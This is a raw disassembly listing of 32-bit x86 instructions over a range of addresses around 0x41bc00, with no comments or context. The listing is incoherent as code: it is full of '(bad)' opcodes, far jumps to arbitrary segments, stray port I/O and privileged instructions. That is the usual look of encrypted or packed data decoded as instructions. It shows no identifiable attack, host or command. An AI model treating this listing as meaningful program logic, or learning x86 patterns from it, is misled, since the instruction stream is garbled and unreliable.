  41bbdb:	mov    ah,0x5e
  41bbdd:	cli    
  41bbde:	call   0x9f3a:0x8df2c02
  41bbe5:	jae    0x41bbde
  41bbe7:	push   ecx
  41bbe8:	inc    esi
  41bbe9:	xor    BYTE PTR [ebx],ah
  41bbeb:	inc    esi
  41bbec:	in     al,0xce
  41bbee:	dec    eax
  41bbef:	cdq    
  41bbf0:	pop    ebp
  41bbf1:	out    dx,eax
  41bbf2:	jno    0x41bc6f
  41bbf4:	inc    eax
  41bbf5:	adc    al,0x13
  41bbf7:	inc    edi
  41bbf8:	inc    edx
  41bbf9:	call   0x1355:0x1f25d83d
  41bc00:	(bad)  
  41bc01:	aam    0x6e
  41bc03:	fs push esp
  41bc05:	xchg   ebp,eax
  41bc06:	in     eax,dx
  41bc07:	pop    ecx
  41bc08:	mov    ah,0xf4
  41bc0a:	imul   ecx,DWORD PTR [ecx+0x6d7b82ed],0x1f
  41bc11:	sub    al,ah
  41bc13:	int3   
  41bc14:	mov    ah,0xa7
  41bc16:	mov    bl,BYTE PTR [ecx-0x5f0eb7e6]
  41bc1c:	mov    al,ds:0x3f7d85b1
  41bc21:	mov    ds:0x31e2a3f7,al
  41bc26:	(bad)  
  41bc27:	not    DWORD PTR [edx+0x71]
  41bc2a:	push   ebp
  41bc2b:	xor    BYTE PTR [ebp-0x5d],ah
  41bc2e:	push   edi
  41bc2f:	jnp    0x41bc02
  41bc31:	xor    esp,DWORD PTR [eax-0x6f]
  41bc34:	retf   
  41bc35:	(bad)  
  41bc36:	xchg   edi,eax
  41bc37:	xchg   ebp,eax
  41bc38:	(bad)  
  41bc39:	ror    BYTE PTR [edx],1
  41bc3b:	mov    eax,ds:0x856a0b81
  41bc40:	inc    ecx
  41bc41:	std    
  41bc42:	and    BYTE PTR [ebx],ch
  41bc44:	aam    0xa2
  41bc46:	jb     0x41bc63
  41bc48:	mov    edi,0x807e4e74
  41bc4d:	stc    
  41bc4e:	lahf   
  41bc4f:	sub    dh,BYTE PTR [edx]
  41bc51:	lods   al,BYTE PTR ds:[esi]
  41bc52:	lea    esp,[ecx+0x61cd8953]
  41bc58:	dec    ecx
  41bc59:	ss adc esi,edx
  41bc5c:	xor    eax,0xbd8fedd0
  41bc61:	lods   al,BYTE PTR ds:[esi]
  41bc62:	test   DWORD PTR [edx-0x4],ebp
  41bc65:	test   DWORD PTR [ecx],ebp
  41bc67:	add    dl,BYTE PTR [ebx+0x36]
  41bc6a:	sti    
  41bc6b:	loopne 0x41bc27
  41bc6d:	test   al,0xad
  41bc6f:	pop    edi
  41bc70:	sbb    DWORD PTR [eax+ecx*1+0x70fd02df],edi
  41bc77:	test   eax,0x71526ede
  41bc7d:	dec    edx
  41bc7e:	or     eax,0xe0f5c9d5
  41bc83:	stos   BYTE PTR es:[edi],al
  41bc84:	cli    
  41bc85:	jb     0x41bd05
  41bc87:	adc    edx,DWORD PTR [edx+0x0]
  41bc8a:	or     al,0x8c
  41bc8c:	cli    
  41bc8d:	inc    esi
  41bc8e:	dec    edi
  41bc8f:	push   ss
  41bc90:	enter  0x2cac,0xa8
  41bc94:	mov    eax,0xb6b80af0
  41bc99:	push   ss
  41bc9a:	mov    ds:0x38299d53,eax
  41bc9f:	add    al,0x3c
  41bca1:	cdq    
  41bca2:	outs   dx,BYTE PTR ds:[esi]
  41bca3:	in     eax,0xc6
  41bca5:	dec    eax
  41bca6:	pop    ebp
  41bca7:	fild   DWORD PTR ds:0x3e769c05
  41bcad:	cmc    
  41bcae:	push   ebx
  41bcaf:	or     bh,bl
  41bcb1:	and    eax,0xfb3e484d
  41bcb6:	pop    es
  41bcb7:	inc    ebp
  41bcb8:	mov    WORD PTR [eax+0x47],fs
  41bcbb:	fst    st(7)
  41bcbd:	xor    esi,DWORD PTR [edi-0x30]
  41bcc0:	inc    esp
  41bcc1:	enter  0x5b17,0x6
  41bcc5:	mov    esi,0xa1f27ee0
  41bcca:	push   cs
  41bccb:	repz (bad) 
  41bccd:	out    dx,al
  41bcce:	(bad)  
  41bccf:	aaa    
  41bcd0:	lds    ax,DWORD PTR [edx+eiz*4]
  41bcd4:	das    
  41bcd5:	mov    eax,ds:0xd2b3391
  41bcda:	adc    al,0x61
  41bcdc:	push   ecx
  41bcdd:	xor    al,0xe8
  41bcdf:	loope  0x41bccb
  41bce1:	stc    
  41bce2:	outs   dx,BYTE PTR ds:[esi]
  41bce3:	dec    edx
  41bce4:	mov    edi,DWORD PTR [ebx-0x29]
  41bce7:	dec    edx
  41bce8:	sbb    DWORD PTR [ebx+0x6a],ecx
  41bceb:	into   
  41bcec:	mov    ecx,DWORD PTR [ebp+0x5e]
  41bcef:	sub    al,0xd
  41bcf1:	lock data16 adc al,0xf8
  41bcf5:	pop    ebp
  41bcf6:	hlt    
  41bcf7:	jg     0x41bce4
  41bcf9:	push   edx
  41bcfa:	nop
  41bcfb:	aas    
  41bcfc:	or     edi,ebp
  41bcfe:	push   0xffffffb7
  41bd00:	inc    esi
  41bd01:	jbe    0x41bcd9
  41bd03:	in     al,dx
  41bd04:	sbb    ebx,esp
  41bd06:	jl     0x41bced
  41bd08:	mov    bh,0x1b
  41bd0a:	aad    0xc8
  41bd0c:	(bad)  
  41bd0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd0f:	push   ds
  41bd10:	xor    eax,0xea8afdc8
  41bd15:	mov    eax,0x71e4564c
  41bd1a:	iret   
  41bd1b:	inc    edi
  41bd1c:	cli    
  41bd1d:	jle    0x41bd91
  41bd1f:	enter  0xb130,0xbf
  41bd23:	inc    ecx
  41bd24:	xchg   esp,eax
  41bd25:	xchg   esi,eax
  41bd26:	push   ss
  41bd27:	not    bl
  41bd29:	mov    ds:0x89b12b3a,eax
  41bd2e:	sbb    esp,ebp
  41bd30:	jb     0x41bd0d
  41bd32:	popa   
  41bd33:	jnp    0x41bd15
  41bd35:	sar    esp,1
  41bd37:	xor    bl,bl
  41bd39:	sbb    eax,0x912f0795
  41bd3e:	mov    BYTE PTR [ecx],dl
  41bd40:	jmp    0x41bd35
  41bd42:	in     eax,0x4d
  41bd44:	test   DWORD PTR [ebx+edi*2-0x11e29e3d],ebx
  41bd4b:	ror    dl,cl
  41bd4d:	enter  0x41b6,0x91
  41bd51:	out    0xe1,al
  41bd53:	pop    esi
  41bd54:	enter  0x8f6,0x44
  41bd58:	inc    esi
  41bd59:	scas   eax,DWORD PTR es:[edi]
  41bd5a:	outs   dx,BYTE PTR ds:[esi]
  41bd5b:	les    ebp,FWORD PTR [ebx+0x73f6d79c]
  41bd61:	test   al,0x35
  41bd63:	and    DWORD PTR ds:0xd4ea2ce9,eax
  41bd69:	cs push ebx
  41bd6b:	sub    bh,BYTE PTR [ebp-0x5454d523]
  41bd71:	jae    0x41bd7f
  41bd73:	js     0x41bdaa
  41bd75:	jns    0x41bddc
  41bd77:	push   edi
  41bd78:	gs cs lock aaa 
  41bd7c:	repnz pusha 
  41bd7e:	add    eax,0xc68cf3f1
  41bd83:	mov    ?,WORD PTR [edx+edi*4]
  41bd86:	sti    
  41bd87:	cwde   
  41bd88:	sbb    DWORD PTR [esi],edi
  41bd8a:	cmp    ecx,DWORD PTR ds:0x87ff61df
  41bd90:	pop    ebx
  41bd91:	dec    ebp
  41bd92:	mov    ebp,0x33b6b8da
  41bd97:	stos   DWORD PTR es:[edi],eax
  41bd98:	cmp    ebx,DWORD PTR [ebx+0x421c9e36]
  41bd9e:	test   eax,0xb9f8334b
  41bda3:	les    ecx,FWORD PTR [ebx]
  41bda5:	std    
  41bda6:	xlat   BYTE PTR ds:[ebx]
  41bda7:	inc    ebx
  41bda8:	push   esi
  41bda9:	rcl    DWORD PTR [esi-0x26],0xa6
  41bdad:	dec    ebp
  41bdae:	mov    DWORD PTR [ebx-0x30],esp
  41bdb1:	dec    BYTE PTR [edx-0x41]
  41bdb4:	sub    al,0x38
  41bdb6:	jnp    0x41bdf5
  41bdb8:	je     0x41bdff
  41bdba:	(bad)  
  41bdbb:	cmp    BYTE PTR [ecx-0x2f],0x2c
  41bdbf:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bdc1:	push   edx
  41bdc2:	cli    
  41bdc3:	ror    ebx,1
  41bdc5:	sti    
  41bdc6:	in     eax,dx
  41bdc7:	imul   ebx,DWORD PTR [ecx+ecx*8-0x43a9ac9b],0x2f3fbc06
  41bdd2:	inc    ebx
  41bdd3:	jg     0x41bdf4
  41bdd5:	pop    eax
  41bdd6:	mov    ds:0x435bf7fc,eax
  41bddb:	enter  0x5cc3,0x2a
  41bddf:	es fcmovnb st,st(2)
  41bde2:	jb     0x41bdc2
  41bde4:	jg     0x41bda7
  41bde6:	les    esi,FWORD PTR [eax-0x47]
  41bde9:	fs mov esp,edx
  41bdec:	rcr    BYTE PTR [esi+0x7e],0x6a
  41bdf0:	mov    ecx,0x863b5fe9
  41bdf5:	push   cs
  41bdf6:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bdf8:	popf   
  41bdf9:	push   ebx
  41bdfa:	ins    BYTE PTR es:[edi],dx
  41bdfb:	(bad)  
  41bdfc:	fisubr DWORD PTR [edi]
  41bdfe:	jnp    0x41bddc
  41be00:	addr16 inc ecx
  41be02:	call   0x6dceb40e
  41be07:	mov    edi,0xcac1fcdd
  41be0c:	lea    ecx,[eax-0x263cd056]
  41be12:	int    0xfc
  41be14:	sbb    eax,DWORD PTR [edi+0xbdca4dd]
  41be1a:	(bad)  
  41be1b:	push   0xbcf96963
  41be20:	(bad)  
  41be21:	rcr    BYTE PTR [ecx+ebx*8+0x5f],cl
  41be25:	inc    edi
  41be26:	xchg   edi,eax
  41be27:	mov    DWORD PTR [esi-0x3c],ecx
  41be2a:	shr    BYTE PTR [ecx-0x579d6d99],cl
  41be30:	xlat   BYTE PTR ds:[ebx]
  41be31:	mov    eax,ds:0x850b17c1
  41be36:	(bad)  
  41be37:	mov    ds,edi
  41be39:	xchg   esi,eax
  41be3a:	mov    edi,0xb200b92b
  41be3f:	push   esp
  41be40:	mov    ds:0x5dc7b8fe,eax
  41be45:	cli    
  41be46:	dec    ebx
  41be47:	bound  edi,QWORD PTR [ebx+0x6a13456f]
  41be4d:	mov    ds:0x3628773e,al
  41be52:	xor    esi,0x50493d90
  41be58:	sbb    ah,dh
  41be5a:	ret    
  41be5b:	fs cmc 
  41be5d:	js     0x41be71
  41be5f:	je     0x41beca
  41be61:	lock data16 mov cs,WORD PTR [ecx]
  41be65:	ror    DWORD PTR [ebp-0x2],cl
  41be68:	sub    ah,cl
  41be6a:	or     eax,0xad5973f3
  41be6f:	pop    ss
  41be70:	iret   
  41be71:	jle    0x41be4d
  41be73:	xor    ebx,DWORD PTR [edx]
  41be75:	int3   
  41be76:	cld    
  41be77:	ror    esi,0xa7
  41be7a:	hlt    
  41be7b:	cmp    eax,0x3514e4f3
  41be80:	jnp    0x41be0a
  41be82:	mov    ah,0xa3
  41be84:	fs and al,0xc4
  41be87:	and    eax,0x15b34cba
  41be8c:	jmp    0x9c82:0xe443f925
  41be93:	or     BYTE PTR [edi+esi*2+0x8],bl
  41be97:	fdivr  QWORD PTR [ebp-0x71]
  41be9a:	or     DWORD PTR ds:0x95b905f2,eax
  41bea0:	or     cl,BYTE PTR [esi-0x433cf2ad]
  41bea6:	bnd je 0x41bedc
  41bea9:	and    al,0xb0
  41beab:	div    BYTE PTR [esi-0x2ec96c5f]
  41beb1:	fs xchg ebx,eax
  41beb3:	or     al,0x35
  41beb5:	sub    al,0x72
  41beb7:	outs   dx,BYTE PTR ds:[esi]
  41beb8:	fwait
  41beb9:	lods   al,BYTE PTR ds:[esi]
  41beba:	sbb    esp,edx
  41bebc:	push   edi
  41bebd:	dec    ebp
  41bebe:	int3   
  41bebf:	adc    al,0xc0
  41bec1:	sbb    DWORD PTR [ebx+edi*2-0x3b7dc901],ebp
  41bec8:	mov    ds:0x5efe0794,al
  41becd:	cmp    dh,cl
  41becf:	cmp    al,0xc0
  41bed1:	jl     0x41be7d
  41bed3:	fdiv   QWORD PTR [ebx-0x50]
  41bed6:	pop    esp
  41bed7:	loopne 0x41bf52
  41bed9:	mov    al,0x5
  41bedb:	mov    bh,0xb8
  41bedd:	push   edx
  41bede:	or     al,0x4f
  41bee0:	enter  0xc1f8,0xbe
  41bee4:	jmp    0x529c:0xce31b9fd
  41beeb:	jae    0x41be95
  41beed:	aam    0x29
  41beef:	or     DWORD PTR [edi-0x42b75650],ecx
  41bef5:	jmp    0x11de903e
  41befa:	shl    BYTE PTR [eax+0x25],1
  41befd:	sub    al,0x29
  41beff:	jmp    FWORD PTR es:[esi]
  41bf02:	mov    ebx,0x6ed171c
  41bf07:	sbb    eax,0x72
  41bf0a:	add    BYTE PTR [edi-0x74],bh
  41bf0d:	clc    
  41bf0e:	add    ebx,eax
  41bf10:	cmp    ecx,DWORD PTR [eax]
  41bf12:	push   edi
  41bf13:	dec    edx
  41bf14:	lods   al,BYTE PTR ds:[esi]
  41bf15:	sbb    dl,ah
  41bf17:	shl    BYTE PTR [edx],0xe8
  41bf1a:	push   cs
  41bf1b:	add    al,0x26
  41bf1d:	add    eax,0x897e337e
  41bf22:	and    BYTE PTR [ebx],bh
  41bf24:	(bad)  [ebx-0x5138c2bd]
  41bf2a:	or     edi,eax
  41bf2c:	in     al,0x35
  41bf2e:	sub    DWORD PTR [ebp+ebx*4-0x42],ecx
  41bf32:	jle    0x41bf65
  41bf34:	xor    BYTE PTR [edx],0x27
  41bf37:	ror    BYTE PTR [ebx+esi*2-0x36],0xe4
  41bf3c:	sbb    DWORD PTR [ebx+0x33],ebp
  41bf3f:	and    edx,DWORD PTR [esi+0x4e4067d5]
  41bf45:	popf   
  41bf46:	jbe    0x41bf65
  41bf48:	sub    eax,0x77c4b04
  41bf4d:	mul    cl
  41bf4f:	test   eax,0xa65ce36b
  41bf54:	into   
  41bf55:	ins    BYTE PTR es:[edi],dx
  41bf56:	xchg   ebx,eax
  41bf57:	pop    ebp
  41bf58:	inc    edx
  41bf59:	add    DWORD PTR [ebp+0x7fc75acc],esp
  41bf5f:	jns    0x41beff
  41bf61:	xor    dl,BYTE PTR [esp+edi*8+0x51284e3f]
  41bf68:	adc    ebp,DWORD PTR [ecx]
  41bf6a:	pop    edx
  41bf6b:	ja     0x41bf9f
  41bf6d:	or     cl,BYTE PTR ds:0x587d2f65
  41bf73:	push   0x94ed9935
  41bf78:	inc    ebx
  41bf79:	mov    bl,0x20
  41bf7b:	ret    0xf7c3
  41bf7e:	fidivr WORD PTR [edx+0x2f]
  41bf81:	pop    edi
  41bf82:	push   ecx
  41bf83:	cmovae ebp,esp
  41bf86:	mov    eax,ds:0x5466d7a6
  41bf8b:	loopne 0x41bf5b
  41bf8d:	xor    DWORD PTR [ebp-0x4b],edi
  41bf90:	xor    DWORD PTR [esi-0x3cde8c4c],edi
  41bf96:	push   edx
  41bf97:	(bad)  
  41bf98:	aas    
  41bf99:	ins    BYTE PTR es:[edi],dx
  41bf9a:	pop    ss
  41bf9b:	pop    ecx
  41bf9c:	fwait
  41bf9d:	or     al,0xcc
  41bf9f:	pop    ds
  41bfa0:	sbb    ecx,ebp
  41bfa2:	xor    DWORD PTR [ebx+ecx*8-0x36],esp
  41bfa6:	jl     0x41bf92
  41bfa8:	cmc    
  41bfa9:	addr16 repz shr ah,0x74
  41bfae:	hlt    
  41bfaf:	xchg   BYTE PTR [edx-0x6e36ccb9],dl
  41bfb5:	push   ecx
  41bfb6:	push   ecx
  41bfb7:	mov    DWORD PTR ds:0x7e142e08,esi
  41bfbd:	cmp    ch,BYTE PTR [edx+0x795cfa9c]
  41bfc3:	mov    dh,0xc9
  41bfc5:	adc    BYTE PTR [eax],dl
  41bfc7:	idiv   BYTE PTR [edx]
  41bfc9:	lahf   
  41bfca:	sbb    esp,DWORD PTR [edx-0x51]
  41bfcd:	cmp    DWORD PTR [ebx+esi*8-0x185cd3e0],edx
  41bfd4:	daa    
  41bfd5:	cwde   
  41bfd6:	mov    eax,0xe2da440d
  41bfdb:	and    DWORD PTR [ecx+0xd],ebp
  41bfde:	scas   eax,DWORD PTR es:[edi]
  41bfdf:	or     dl,dl
  41bfe1:	sti    
  41bfe2:	xchg   edx,eax
  41bfe3:	out    0x41,al
  41bfe5:	jg     0x41bf9c
  41bfe7:	fmul   QWORD PTR [esp+ecx*4]
  41bfea:	jnp    0x41bf97
  41bfec:	xchg   edx,eax
  41bfed:	pop    ss
  41bfee:	jae    0x41c028
  41bff0:	cdq    
  41bff1:	jmp    0xc569:0x338dc2ea
  41bff8:	lock dec ebx
  41bffa:	mov    esi,0x11db395d
  41bfff:	push   ebx
  41c000:	adc    eax,0x6aedc308
  41c005:	mov    bl,0x64
  41c007:	aad    0xd
  41c009:	dec    eax
  41c00a:	aad    0xa4
  41c00c:	lahf   
  41c00d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c00e:	neg    BYTE PTR [edx]
  41c010:	stos   DWORD PTR es:[edi],eax
  41c011:	test   eax,0x19e3ff9a
  41c016:	cmp    al,0xe7
  41c018:	and    bh,BYTE PTR [ebx]
  41c01a:	mov    dl,0x6d
  41c01c:	mov    ss,WORD PTR [ecx-0x4b]
  41c01f:	dec    ebx
  41c020:	sub    esp,DWORD PTR ds:0x521871ef
  41c026:	mov    ah,0xfb
  41c028:	repz push ebp
  41c02a:	xor    esp,DWORD PTR [ecx-0x36]
  41c02d:	in     eax,dx
  41c02e:	dec    ecx
  41c02f:	ficomp DWORD PTR [ecx-0x2ea9b480]
  41c035:	not    ebx
  41c037:	push   esi
  41c038:	sub    bl,dh
  41c03a:	pop    eax
  41c03b:	mov    bh,0xac
  41c03d:	(bad)  
  41c03e:	jge    0x41c078
  41c040:	aam    0xf1
  41c042:	or     al,0x1b
  41c044:	push   esp
  41c045:	shl    BYTE PTR [edx],cl
  41c047:	cmp    DWORD PTR [eax],edi
  41c049:	icebp  
  41c04a:	dec    esp
  41c04b:	leave  
  41c04c:	leave  
  41c04d:	gs out dx,al
  41c04f:	dec    edi
  41c050:	js     0x41bfe8
  41c052:	js     0x41c044
  41c054:	add    al,0xac
  41c056:	mov    ds:0xc5251830,eax
  41c05b:	xchg   ecx,eax
  41c05c:	jmp    0x41c07b
  41c05e:	sub    eax,0xf3fea278
  41c063:	add    bh,BYTE PTR [ecx-0x6044dd13]
  41c069:	fadd   DWORD PTR [eax+esi*2+0x55]
  41c06d:	and    al,0xec
  41c06f:	mov    ds:0x597a2f27,eax
  41c074:	popf   
  41c075:	test   DWORD PTR [ebx-0x15],esp
  41c078:	out    dx,eax
  41c079:	jmp    eax
  41c07b:	jnp    0x41c053
  41c07d:	mov    dl,0x65
  41c07f:	aaa    
  41c080:	test   ebp,ebx
  41c082:	mov    ecx,0xa8565004
  41c087:	pop    es
  41c088:	dec    esp
  41c089:	repz repz ss jbe 0x41c090
  41c08e:	stc    
  41c08f:	xchg   ebp,eax
  41c090:	pop    ebx
  41c091:	out    dx,al
  41c092:	mov    bl,0x14
  41c094:	xchg   esp,eax
  41c095:	jge    0x41c052
  41c097:	cmp    cl,BYTE PTR [edi]
  41c099:	hlt    
  41c09a:	bound  eax,QWORD PTR [ebp+0x324a3214]
  41c0a0:	add    eax,0xe802c64b
  41c0a5:	cwde   
  41c0a6:	cmp    eax,0x5331d386
  41c0ab:	and    eax,0x1dc67c52
  41c0b0:	inc    edx
  41c0b1:	out    dx,al
  41c0b2:	push   ecx
  41c0b3:	mov    ds:0x9fd17283,al
  41c0b8:	or     BYTE PTR [edi],ch
  41c0ba:	and    eax,0x3fa7ccc3
  41c0bf:	mov    DWORD PTR [edx],esi
  41c0c1:	fsub   DWORD PTR [edi+0x15]
  41c0c4:	(bad)  
  41c0c5:	loop   0x41c0a2
  41c0c7:	sub    cl,BYTE PTR [eax+edi*2-0x42e2203b]
  41c0ce:	jecxz  0x41c0fe
  41c0d0:	test   bh,dh
  41c0d2:	mov    cs,WORD PTR [esi+0x6]
  41c0d5:	das    
  41c0d6:	stos   BYTE PTR es:[di],al
  41c0d8:	fcom   QWORD PTR [ebx]
  41c0da:	mov    edi,0x793d1890
  41c0df:	sahf   
  41c0e0:	js     0x41c0ac
  41c0e2:	retf   
  41c0e3:	dec    edx
  41c0e4:	inc    ebp
  41c0e5:	inc    edi
  41c0e6:	xor    eax,0x20f21eae
  41c0eb:	pop    ebx
  41c0ec:	sbb    edi,DWORD PTR [edi+0x7e58c005]
  41c0f2:	jb     0x41c14e
  41c0f4:	stos   BYTE PTR es:[edi],al
  41c0f5:	out    dx,eax
  41c0f6:	enter  0x8b2e,0x31
  41c0fa:	jmp    0x41c145
  41c0fc:	pop    es
  41c0fd:	(bad)  
  41c0fe:	cmp    eax,DWORD PTR [ebx-0x1e]
  41c101:	add    esp,esi
  41c103:	adc    BYTE PTR [esi*1+0x793bf4d1],bl
  41c10a:	add    eax,ecx
  41c10c:	jg     0x41c11e
  41c10e:	loope  0x41c126
  41c110:	jne    0x41c0b5
  41c112:	and    eax,0xab55f70c
  41c117:	xor    DWORD PTR [esi-0x1a],edi
  41c11a:	jmp    0x41c0b9
  41c11c:	jmp    0x93ea4a70
  41c121:	sbb    DWORD PTR [eax],edi
  41c123:	pop    ss
  41c124:	das    
  41c125:	test   DWORD PTR [ebx+0xd311bf7],esp
  41c12b:	jnp    0x41c0c9
  41c12d:	mov    eax,0xd5619d0c
  41c132:	push   ecx
  41c133:	bound  dx,DWORD PTR [ecx+0x6c2cbf97]
  41c13a:	jo     0x41c152
  41c13c:	lods   al,BYTE PTR ds:[esi]
  41c13d:	push   cs
  41c13e:	dec    ecx
  41c13f:	dec    edx
  41c140:	imul   esi,esp,0xbc3d8f85
  41c146:	cmp    BYTE PTR [edi-0x76239cb6],cl
  41c14c:	and    DWORD PTR [ecx+0x60a57db],0xca77a017
  41c156:	adc    al,0x5
  41c158:	and    al,0x9c
  41c15a:	int3   
  41c15b:	or     eax,edx
  41c15d:	aaa    
  41c15e:	adc    al,0xe3
  41c160:	aaa    
  41c161:	and    dh,BYTE PTR [ebx+0x19]
  41c164:	test   eax,0x80ec01c8
  41c169:	sbb    eax,0xe5fee28b
  41c16e:	add    ah,BYTE PTR [ecx+0x64685b1a]
  41c174:	mov    ds:0x9ed6fc74,al
  41c179:	fstp   DWORD PTR [esi]
  41c17b:	mov    eax,0xb728c7a7
  41c180:	test   DWORD PTR [esi-0x577184cc],ebx
  41c186:	frstor [edx+edx*8+0x46]
  41c18a:	xor    eax,0x954488d4
  41c18f:	push   edi
  41c190:	pop    esp
  41c191:	pop    esi
  41c192:	aas    
  41c193:	cmp    BYTE PTR [esi+0x3f],cl
  41c196:	jnp    0x41c1e7
  41c198:	lea    edi,[edi]
  41c19a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c19b:	loopne 0x41c131
  41c19d:	outs   dx,BYTE PTR ds:[esi]
  41c19e:	sub    eax,0x22d3c4dc
  41c1a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c1a4:	sub    eax,0xfc397496
  41c1a9:	push   cs
  41c1aa:	adc    eax,DWORD PTR ds:0x20405cc9
  41c1b0:	call   DWORD PTR [eax-0x411234fe]
  41c1b6:	pop    esp
  41c1b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c1b8:	iret   
  41c1b9:	clc    
  41c1ba:	cdq    
  41c1bb:	idiv   BYTE PTR [ebx+ecx*4-0x80]
  41c1bf:	fcomp  st(1)
  41c1c1:	fs push es
  41c1c3:	ficomp WORD PTR [edx+esi*4-0x35f430f9]
  41c1ca:	and    ch,cl
  41c1cc:	cmp    al,dl
  41c1ce:	jne    0x41c1d3
  41c1d0:	jle    0x41c1f5
  41c1d2:	in     al,0x45
  41c1d4:	push   eax
  41c1d5:	addr16 dec ecx
  41c1d7:	hlt    
  41c1d8:	call   0xe397:0xa88e8670
  41c1df:	stos   BYTE PTR es:[edi],al
  41c1e0:	xchg   DWORD PTR [edi],edi
  41c1e2:	xor    ch,bl
  41c1e4:	outs   dx,BYTE PTR ds:[si]
  41c1e6:	repnz into 
  41c1e8:	cmc    
  41c1e9:	add    BYTE PTR [ebp+0x7b0a5b89],ah
  41c1ef:	and    edi,DWORD PTR [esp+eax*1]
  41c1f2:	fnstcw WORD PTR [edi+0x24]
  41c1f5:	shl    BYTE PTR [ebp-0x3e],cl
  41c1f8:	out    0xfb,al
  41c1fa:	mov    al,ds:0x4a9ea6e2
  41c1ff:	mov    bh,bl
  41c201:	rcr    DWORD PTR ds:0xed0bda5e,1
  41c207:	inc    BYTE PTR ds:[edi-0xce1f3b0]
  41c20e:	push   eax
  41c20f:	shl    DWORD PTR [eax+0x34b693b1],cl
  41c215:	neg    DWORD PTR [ebp+0x551a4088]
  41c21b:	rcl    BYTE PTR [ebx+0x4f1bce28],cl
  41c221:	fcomip st,st(5)
  41c223:	leave  
  41c224:	adc    BYTE PTR [edi-0x10],ch
  41c227:	lock fbstp TBYTE PTR [ebp+0x59c7821f]
  41c22e:	or     BYTE PTR [ebx+0x1c7d68e2],dl
  41c234:	mov    ecx,DWORD PTR [esi+0x3a292b30]
  41c23a:	sbb    DWORD PTR [eax+esi*1],ebp
  41c23d:	mov    cs,WORD PTR [eax+ecx*2+0x1f]
  41c241:	jle    0x41c251
  41c243:	in     al,0x93
  41c245:	xor    edx,ebp
  41c247:	scas   al,BYTE PTR es:[edi]
  41c248:	jno    0x41c28f
  41c24a:	push   esp
  41c24b:	(bad)  
  41c24c:	popf   
  41c24d:	jecxz  0x41c287
  41c24f:	(bad)  
  41c251:	cwde   
  41c252:	pop    eax
  41c253:	jp     0x41c251
  41c255:	enter  0x201e,0xbb
  41c259:	shl    DWORD PTR [edx+0x6cb1b7af],0x1d
  41c260:	out    0xc7,eax
  41c262:	ins    BYTE PTR es:[edi],dx
  41c263:	aaa    
  41c264:	mov    BYTE PTR [ecx],bh
  41c266:	sub    al,BYTE PTR [edx-0x4]
  41c269:	loope  0x41c2bd
  41c26b:	out    0x69,al
  41c26d:	icebp  
  41c26e:	fld    DWORD PTR [edi]
  41c270:	imul   esp,DWORD PTR [eax],0xffffff92
  41c273:	pop    ss
  41c274:	das    
  41c275:	xchg   edi,eax
  41c276:	jmp    0xb603cffa
  41c27b:	xchg   ebp,eax
  41c27c:	pop    es
  41c27d:	push   ecx
  41c27e:	scas   eax,DWORD PTR es:[edi]
  41c27f:	push   cs
  41c280:	fisub  DWORD PTR [ebx+0x808f24d]
  41c286:	stos   BYTE PTR es:[edi],al
  41c287:	lods   al,BYTE PTR ds:[esi]
  41c288:	pop    esp
  41c289:	test   eax,0xe42336a0
  41c28e:	mov    ecx,0xed46b467
  41c293:	add    BYTE PTR [esi],0xd
  41c296:	shr    DWORD PTR cs:[ecx+edi*4+0x22],cl
  41c29b:	shl    BYTE PTR [edi],cl
  41c29d:	int    0xcf
  41c29f:	test   DWORD PTR [edi-0x34ee56f],0xd43c9f7b
  41c2a9:	leave  
  41c2aa:	jmp    0x41c252
  41c2ac:	mov    DWORD PTR [esi+0x51dc0ef8],eax
  41c2b2:	or     eax,esi
  41c2b4:	data16 out 0x23,al
  41c2b7:	lods   eax,DWORD PTR ds:[esi]
  41c2b8:	sub    al,BYTE PTR ds:[edi-0x1ef68bb6]
  41c2bf:	imul   edi,DWORD PTR [esi-0x73],0x1cf6af1e
  41c2c6:	pop    edi
  41c2c7:	jmp    0x41c332
  41c2c9:	adc    DWORD PTR [esi+edx*4],esi
  41c2cc:	gs in  eax,0x73
  41c2cf:	sbb    ah,BYTE PTR [edi+0x62]
  41c2d2:	or     eax,DWORD PTR [edx+0x4]
  41c2d5:	mov    edi,0xc03032bb
  41c2da:	iret   
  41c2db:	push   edi
  41c2dc:	lahf   
  41c2dd:	fdiv   DWORD PTR [esi]
  41c2df:	inc    ecx
  41c2e0:	jl     0x41c273
  41c2e2:	xor    DWORD PTR [esp+ecx*2+0x5f225c5],ecx
  41c2e9:	cmp    al,0x3f
  41c2eb:	je     0x41c2dd
  41c2ed:	mov    bl,0xbb
  41c2ef:	mov    al,ds:0xb34b7f3a
  41c2f4:	retf   0x7979
  41c2f7:	addr16 jae 0x41c2f1
  41c2fa:	push   esi
  41c2fb:	ja     0x41c2c2
  41c2fd:	es stos DWORD PTR es:[edi],eax
  41c2ff:	je     0x41c308
  41c301:	hlt    
  41c302:	pushf  
  41c303:	iret   
  41c304:	mov    WORD PTR [ebp-0x745ab29b],fs
  41c30a:	aas    
  41c30b:	xor    al,0x8
  41c30d:	push   cs
  41c30e:	sbb    ch,BYTE PTR [esi]
  41c310:	push   ss
  41c311:	inc    ebx
  41c312:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c313:	(bad)  
  41c314:	out    0x8,al
  41c316:	jns    0x41c33e
  41c318:	jle    0x41c2ea
  41c31a:	int    0x3e
  41c31c:	int3   
  41c31d:	aas    
  41c31e:	and    eax,0xd8349c30
  41c323:	sti    
  41c324:	xor    dh,bl
  41c326:	lods   al,BYTE PTR ds:[esi]
  41c327:	sbb    eax,0x5d51265d
  41c32c:	mov    eax,ds:0x714c2850
  41c331:	ret    
  41c332:	loop   0x41c2e7
  41c334:	or     esi,DWORD PTR [ecx-0x76a819a7]
  41c33a:	mov    cl,0x67
  41c33c:	dec    ecx
  41c33d:	pusha  
  41c33e:	mov    DWORD PTR ds:0x1251bbcd,ebp
  41c344:	mov    WORD PTR [ebx+eax*1-0x6231a466],?
  41c34b:	shr    ah,0xb9
  41c34e:	and    DWORD PTR ss:[esi-0x3a],0x54
  41c353:	pop    ecx
  41c354:	add    BYTE PTR [ecx-0x72],cl
